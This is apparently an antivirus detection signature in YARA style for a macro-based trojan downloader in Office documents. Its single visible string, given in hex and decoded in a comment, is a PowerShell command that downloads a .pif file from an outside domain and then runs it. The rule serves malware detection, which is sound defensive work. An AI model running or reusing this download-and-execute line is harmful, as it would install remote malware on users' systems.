...
rule TrojanDownloader_O97M_Powdow_STW_MTB{
	meta:
		description = "TrojanDownloader:O97M/Powdow.STW!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 "
	...
	strings :
		...
		$a_01_1 = {49 6e 76 6f 6b 65 2d 57 65 62 52 65 71 75 65 73 74 20 2d 55 72 69 20 22 22 68 74 74 70 73 3a 2f 2f 6d 69 6e 64 66 72 65 65 2e 63 6f 2e 7a 61 2f 31 2f 52 65 63 72 79 70 74 65 64 2e 70 69 66 22 22 20 2d 4f 75 74 46 69 6c 65 20 24 54 65 6d 70 46 69 6c 65 3b 20 53 74 61 72 74 2d 50 72 6f 63 65 73 73 20 24 54 65 6d 70 46 69 6c 65 3b } //1 Invoke-WebRequest -Uri ""https://mindfree.co.za/1/Recrypted.pif"" -OutFile $TempFile; Start-Process $TempFile;
